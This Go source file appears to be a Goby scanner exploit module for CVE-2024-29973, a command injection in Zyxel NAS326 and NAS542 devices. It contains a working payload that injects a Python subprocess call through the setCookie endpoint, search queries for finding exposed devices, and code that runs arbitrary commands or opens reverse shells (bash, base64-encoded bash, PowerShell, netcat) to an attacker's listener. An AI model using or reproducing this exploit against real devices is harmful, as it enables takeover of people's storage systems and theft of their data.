package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Zyxel NAS /cmd/simZysh/register_main/setCookie Command Execution Vulnerability CVE-2024-29973",
    "Description": "<p>Zyxel NAS542 and Zyxel NAS326 are both products of China's Zyxel Corporation. Zyxel NAS542 is a NAS (Network Attached Storage) device. Zyxel NAS326 is a cloud storage NAS. </p><p>Zyxel NAS326 versions prior to V5.21(AAZF.17)C0 and NAS542 versions prior to V5.21(ABAG.14)C0 have an operating system command injection vulnerability. The vulnerability is caused by a command injection vulnerability in the setCookie parameter, which allows an attacker to execute certain operating system (OS) commands through an HTTP POST request.</p>",
    "Product": "Zyxel NAS",
    "Homepage": "https://www.zyxel.com/",
    "DisclosureDate": "2024-06-19",
    "PostTime": "2024-06-19",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"/cmd,/ck6fup6/user_grp_cgi/cgi_modify_userinfo\" || (banner=\"NAS326\" && protocol=\"afp\") || banner=\"NAS326 login\" || (cert=\"NAS326\" && protocol!=\"ftp\" && cert=\"zyxel\")",
    "GobyQuery": "body=\"/cmd,/ck6fup6/user_grp_cgi/cgi_modify_userinfo\" || (banner=\"NAS326\" && protocol=\"afp\") || banner=\"NAS326 login\" || (cert=\"NAS326\" && protocol!=\"ftp\" && cert=\"zyxel\")",
    "Level": "3",
    "Impact": "<p>Zyxel NAS326 versions prior to V5.21(AAZF.17)C0 and NAS542 versions prior to V5.21(ABAG.14)C0 have an operating system command injection vulnerability. The vulnerability is caused by a command injection vulnerability in the setCookie parameter, which allows attackers to execute certain operating system (OS) commands through HTTP POST requests, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>Please contact the manufacturer to upgrade to the latest security version.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-29973"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.7",
    "Translation": {
        "CN": {
            "Name": "Zyxel NAS /cmd/simZysh/register_main/setCookie 命令执行漏洞 CVE-2024-29973",
            "Product": "Zyxel NAS",
            "Description": "<p>Zyxel NAS542和Zyxel NAS326都是中国合勤（Zyxel）公司的产品。Zyxel NAS542是一款NAS（网络附加存储）设备。Zyxel NAS326是一款云存储 NAS。</p><p>Zyxel NAS326 V5.21(AAZF.17)C0之前版本、NAS542 V5.21(ABAG.14)C0之前版本存在操作系统命令注入漏洞，该漏洞源于setCookie参数中存在命令注入漏洞，从而导致攻击者可通过HTTP POST请求来执行某些操作系统 (OS) 命令。<br></p>",
            "Recommendation": "<p>请联系厂商升级至最新安全版本。</p>",
            "Impact": "<p>Zyxel NAS326 V5.21(AAZF.17)C0之前版本、NAS542 V5.21(ABAG.14)C0之前版本存在操作系统命令注入漏洞，该漏洞源于setCookie参数中存在命令注入漏洞，从而导致攻击者可通过HTTP POST请求来执行某些操作系统 (OS) 命令，获取服务器权限，进⽽控制整个web服务器。<br><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Zyxel NAS /cmd/simZysh/register_main/setCookie Command Execution Vulnerability CVE-2024-29973",
            "Product": "Zyxel NAS",
            "Description": "<p>Zyxel NAS542 and Zyxel NAS326 are both products of China's Zyxel Corporation. Zyxel NAS542 is a NAS (Network Attached Storage) device. Zyxel NAS326 is a cloud storage NAS.&nbsp;</p><p>Zyxel NAS326 versions prior to V5.21(AAZF.17)C0 and NAS542 versions prior to V5.21(ABAG.14)C0 have an operating system command injection vulnerability. The vulnerability is caused by a command injection vulnerability in the setCookie parameter, which allows an attacker to execute certain operating system (OS) commands through an HTTP POST request.</p>",
            "Recommendation": "<p>Please contact the manufacturer to upgrade to the latest security version.<br></p>",
            "Impact": "<p>Zyxel NAS326 versions prior to V5.21(AAZF.17)C0 and NAS542 versions prior to V5.21(ABAG.14)C0 have an operating system command injection vulnerability. The vulnerability is caused by a command injection vulnerability in the setCookie parameter, which allows attackers to execute certain operating system (OS) commands through HTTP POST requests, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10962"
}`

	setPayloadRequestHash0001 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}
		makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			re := regexp.MustCompile(RegularUrl)
			// 查找匹配的内容
			matches := re.FindStringSubmatch(RegularContent)
			if len(matches) > 1 {
				return matches[1], nil
			} else {
				return "", fmt.Errorf("can't match value")
			}
		}
		//漏洞url地址
		url := "/cmd,/simZysh/register_main/setCookie"
		header := map[string]string{
			"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 ldwk",
			"Content-Type": "multipart/form-data; boundary=--------------------------0987654321",
		}

		data := "----------------------------0987654321\r\nContent-Disposition: form-data; name=\"c0\"\r\n\r\nstorage_ext_cgi CGIGetExtStoInfo None) and False or __import__(\"subprocess\").check_output(\"" + command + "\", shell=True)#\r\n----------------------------0987654321--\r\n"
		resp, err := setPostRequest(hostInfo, url, data, header)
		if err != nil || resp.StatusCode != 200 {
			fmt.Println("resp statuscode not 200")
			return "", "", err
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult, _ := makeRegular(resp.RawBody, `"zyshdata0": \[(.*?)\]`)

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			//开头为数字，他就只会返回第一段数字部分
			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "busybox sh -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
